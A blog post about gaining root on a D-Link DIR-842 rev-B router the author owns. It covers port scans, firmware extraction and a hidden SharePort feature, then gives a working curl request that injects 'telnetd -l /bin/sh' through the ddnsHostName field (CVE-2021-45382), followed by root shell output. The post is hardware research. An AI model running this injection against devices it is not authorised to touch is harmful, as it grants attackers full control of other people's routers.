+++
title = "D-LINK DIR-842 Rev-B privilege escalation"
description = "A quick blog post on how to enable telnet your REV-B device"
tags = [
"howto",
"research",
"firmware",
"shell",
]
date = "2022-06-06 17:00:00"
categories = [
"Research",
"Exploration",
]
keywords = [
"firmware",
"howto",
"research",
"shell",
]
image = "cover.png"

+++


In this quick blog post we'll see how to enable Telnet on your DIR-842 rev-b
<!--more-->


# Some background

There are known vulnerabilities on D-Link's DIR-842, but they are about the [rev-C models](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10184).

The rev-B are running a different portal AFAIK, and no exploit for code execution was found during research.

## A first portscan

```shell
$ nmap 192.168.240.1
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-07 06:09 CEST
Nmap scan report for 192.168.240.1
Host is up (0.0029s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
443/tcp  open  https
MAC Address: 10:62:FF:FF:5A:FF (D-Link International)
```

Other than the usual web interface nothing special to see.

## Firmware extraction

As usual `binwalk` is used on the last firmware.

We're looking for web files and endpoints not mentioned in the web interface itself.

The first candidate we found was 

`http://192.168.0.1/SharePort.html`

![Home](/dlink/dir-842-shareport.png)

This feature shouldn't be present as the device has no USB ports whatsoever.

*So we enabled it :)*

## Exploring SharePort

After enabling the Web File Access, we run another port scan :

```shell
$ nmap 192.168.240.1
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-07 06:15 CEST
Nmap scan report for 192.168.240.1
Host is up (0.0029s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
443/tcp  open  https
8181/tcp open  intermapper
MAC Address: 10:62:FF:FF:5A:FF (D-Link International)
```

A new port has been opened, revealing another interface :

![Home](/dlink/dir-842-shareport-open.png)

Adding users and trying them doesn't bring any results as most requests are not implemented.

## Switching to CVE-2021-45382 

What is familiar though, is the call to `misc.ccp`, which is made on that portal's login page.

A quick research dig bring up a result for this specific D-Link portal, where `ddns_check.ccp` is vulnerable to 
command injection.

Kudos to [eh-easyhacks](https://eh-easyhacks.blogspot.com/2022/04/cve-2021-45382.html) for the details on the CVE !

You're going to need :

- Be authenticated on port 80, session opened
- `User-Agent` set
- `Referer` set

```shell
curl -kv 'http://192.168.240.1/ddns_check.ccp' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36' \
  -H 'Referer: http://192.168.240.1:8181/login.asp' \
  --data-raw 'ccp_act=doCheck&ddnsHostName=;telnetd -l /bin/sh;&ddnsUsername=a&ddnsPassword=b' 
```


## Voila

```shell
$ nmap 192.168.240.1
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-07 06:23 CEST
Nmap scan report for 192.168.240.1
Host is up (0.0027s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
23/tcp   open  telnet
53/tcp   open  domain
80/tcp   open  http
443/tcp  open  https
8181/tcp open  intermapper
MAC Address:  10:62:FF:FF:5A:FF (D-Link International)

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds

$ telnet 192.168.240.1
Trying 192.168.240.1...
Connected to 192.168.240.1.
Escape character is '^]'.

# ps auxwww
  PID USER       VSZ STAT COMMAND
    1 root      1388 S    init      
    2 root         0 SW<  [kthreadd]
    3 root         0 SW<  [ksoftirqd/0]
    4 root         0 SW<  [events/0]
    5 root         0 SW<  [khelper]
    8 root         0 SW<  [async/mgr]
   52 root         0 SW<  [kblockd/0]
   72 root         0 SW   [pdflush]
   73 root         0 SW<  [kswapd0]
  636 root         0 SW<  [mtdblockd]
  667 root         0 SWN  [jffs2_gcd_mtd2]
  683 root      1004 S    resetd 
  710 root      1392 S    -/bin/sh 
  711 root     15272 S    ncc2 
 1072 root     15272 S    ncc2 
 1073 root     15272 S    ncc2 
 1074 root     15272 S    ncc2 
 1075 root     15272 S    ncc2 
 1076 root     15272 S    ncc2 
 1077 root     15272 S    ncc2 
 1078 root     15272 S    ncc2 
 1079 root     15272 S    ncc2 
 1080 root     15272 S    ncc2 
 1083 root      1384 S    klogd 
 1108 root      1392 S    crond 
 5294 root      1384 S    syslogd -L -s 16 
 5714 root      1104 S    dnsmasq -o -u root -i br0 -z br0 -a 192.168.240.1 -x 
 5726 root      1136 S    lld2d br0 
 5729 root      1372 S    mDNSResponderPosix -f /var/tmp/mdns_br0.conf -b -P /v
 7698 root      1616 S    proxy br0 54088 0 /var/tmp/proxy.conf 
 7699 root      1624 S <  proxy br0 54088 0 /var/tmp/proxy.conf 
 7924 root      1092 S    radvd -C /var/tmp/radvd_br0.conf -p /var/run/radvd_br
 8303 root      3736 S    jjhttpd -m RUN_HTTP -d /www -P /var/run/jjhttpd_0.pid
 8309 root      1660 S    lanmapd2 br0 
 8380 root      1536 S    wscd -start -both_band_ap -c /var/wsc.conf -w wlan0 -
 8383 root      1040 S    iwcontrol wlan1 wlan0 
 8398 root      1484 S    pppoe-relay -S eth1 -C br0 
 8407 root      3736 S    jjhttpd -m RUN_HTTP -d /www -P /var/run/jjhttpd_0.pid
13574 root      3636 S    jjhttpd -m RUN_HTTP -d /wa_www -P /var/run/jjhttpd_2.
13577 root      3668 S    jjhttpd -m RUN_HTTPS -d /wa_www -P /var/run/jjhttpd_3
17394 root      3668 S    jjhttpd -m RUN_HTTPS -d /www -P /var/run/jjhttpd_1.pi
17532 root      3636 S    jjhttpd -m RUN_HTTP -d /wa_www -P /var/run/jjhttpd_2.
24434 root      1388 S    telnetd -l /bin/sh 
24755 root      1392 S    /bin/sh 
24762 root      1388 R    ps auxwww 
```
